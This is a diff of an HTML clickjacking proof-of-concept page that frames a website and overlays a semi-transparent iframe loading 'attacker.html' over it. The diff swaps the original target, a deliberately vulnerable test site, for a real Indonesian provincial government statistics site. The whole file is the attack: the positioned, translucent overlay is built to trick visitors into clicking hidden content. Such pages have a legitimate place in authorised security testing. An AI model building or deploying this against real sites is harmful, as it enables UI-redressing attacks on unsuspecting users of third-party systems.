@@ -1,15 +1,21 @@
+<!DOCTYPE html>
 <html>
-	<head>
-		<title>Clickjacking!</title>
-	</head>
+<head>
+    <title>Clickjacking Alert!</title>
+    <link rel="stylesheet" type="text/css" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Clickjacking Vulnerability Alert!</h1>
+        <p>Your web application may be embedded within an iframe, making it susceptible to Clickjacking.</p>
+        <p>Target URL: <a href="https://statistik.bengkuluprov.go.id/">https://statistik.bengkuluprov.go.id/</a></p>
+        <p>If you can see the target website below, it is <span class="vulnerable">VULNERABLE</span> to Clickjacking.</p>
+        <div class="iframe-container">
+            <iframe src="https://statistik.bengkuluprov.go.id/"></iframe>
+        </div>
+    </div>
 
-	<body>
-		<b style="font-size: larger; font-family: Verdana, Geneva, Tahoma, sans-serif;">
-		<p style="font: bold;">Your Web Application Can be Mounted within an iFrame which makes it vulnerable to ClickJacking!</p>
-		<p>Target: <a href="http://testphp.vulnweb.com/login.php">http://testphp.vulnweb.com/login.php</a></p>
-		<p>If you see the target website rendered below, it is <font color="red">VULNERABLE</font>.</p>
-		<iframe width="900" height="600" src="http://testphp.vulnweb.com/login.php"></iframe>
-		<iframe style="position: absolute; left: 45px; top: 250px; opacity: 0.7; font-family:verdana; background: AliceBlue;" src="cj-attacker.html"></iframe>
-		</b>
-	</body>
+    <!-- Include attacker content in the target page -->
+    <iframe style="position: absolute; left: 49%; top: 30%; transform: translate(-50%, -50%); opacity: 0.7; font-family: verdana; background: AliceBlue; width: 270px; height: 120px; border: none;" src="attacker.html"></iframe>
+</body>
 </html>
